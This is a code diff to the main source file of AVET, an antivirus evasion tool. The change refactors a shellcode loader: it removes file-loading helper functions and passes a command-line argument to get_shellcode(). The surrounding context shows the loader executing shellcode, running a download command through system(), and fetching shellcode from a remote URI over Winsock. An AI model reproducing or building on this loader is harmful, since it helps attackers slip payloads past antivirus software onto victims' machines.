@@ -46,8 +46,6 @@ Web: https://github.com/govolution/avet
 #include "get_shellcode.h"
 
 
-int get_filesize(char *fvalue);
-unsigned char* load_textfile(char *fvalue, unsigned char *buf, int size2);
 unsigned char* decode_shellcode(unsigned char *buffer, unsigned char *shellcode, int size);
 #ifdef UVALUE
 char* ie_download(char* string, char* sh_filename);
@@ -58,8 +56,7 @@ unsigned char* downloadshellcode(char* uri);
 
 int main (int argc, char **argv)
 {		
-	char *uvalue = NULL;
-	char *fvalue = NULL;
+	char *uvalue = NULL;	
 
 	int index;
 	int c;
@@ -70,7 +67,7 @@ int main (int argc, char **argv)
 	#include "techniques.h"	
 	
 	// Retrieve shellcode	
-	unsigned char *shellcode = get_shellcode();	
+	unsigned char *shellcode = get_shellcode(argv[1]);	
 	
 	// Bind and execute shellcode here
 	// buf is defined in defs.h by make_avet and contains the shellcode	
@@ -98,18 +95,7 @@ int main (int argc, char **argv)
 		printf("url: %s\n", download);
 	#endif
 	system(download);
-#endif
-
-	#ifdef LVALUE
-		fvalue=argv[1];
-	#endif
-
-	#ifdef PRINT_DEBUG
-		printf ("fvalue = %s ", fvalue);
-		printf ("uvalue = %s \n", uvalue);
-		for (index = optind; index < argc; index++)
-			printf ("Non-option argument %s\n", argv[index]);
-	#endif
+#endif		
 
 #ifdef UVALUE
 	int size = strlen(UVALUE);
@@ -251,64 +237,6 @@ unsigned char* downloadshellcode(char* uri)
 	WSACleanup();
 
 	return sc;	
-}
-#endif
-
-#if defined(LVALUE) || defined(UVALUE)
-int get_filesize(char *fvalue)
-{
-	int size,rc1;
-	FILE *fp1 = fopen(fvalue, "rb");
-	if (fp1 == NULL)
-	{
-		printf("get_filesize, %s not found\n", fvalue);
-		return 0;
-	}
-	for (size = 0; (rc1 = getc(fp1)) != EOF; size++) {}
-	fclose(fp1);
-	
-	#ifdef PRINT_DEBUG
-		printf("get_filesize, filesize %s: %d\n", fvalue, size);
-	#endif
-
-	return size;
-}
-#endif
-
-#if defined(LVALUE) || defined(UVALUE)
-// return pointer to text buffer
-unsigned char* load_textfile(char *fvalue, unsigned char *buffer, int size)
-{
-	#ifdef PRINT_DEBUG
-		printf("load_textfile called: fvalue: %s, size: %d\n", fvalue, size);
-	#endif
-
-	//allocate buffer, open file, read file to the buffer, close the file
-	buffer=(unsigned char*)malloc(size+1);
-	int i, rc;
-
-	for (i=0; i<size; i++)
-		buffer[i]=0x0;
-
-	FILE *fp = fopen(fvalue, "rb");
-	if (fp == NULL)
-	{
-		printf("load_textfile, %s not found\n", fvalue);
-		return 0;
-	}
-
-	for (i=0; i<size; i++)
-	{
-		rc = getc(fp);
-		buffer[i] = rc;
-	}
-
-	#ifdef PRINT_DEBUG
-		printf("%s\n",buffer);
-	#endif
-
-	fclose(fp);
-	return buffer;
 }
 #endif
 
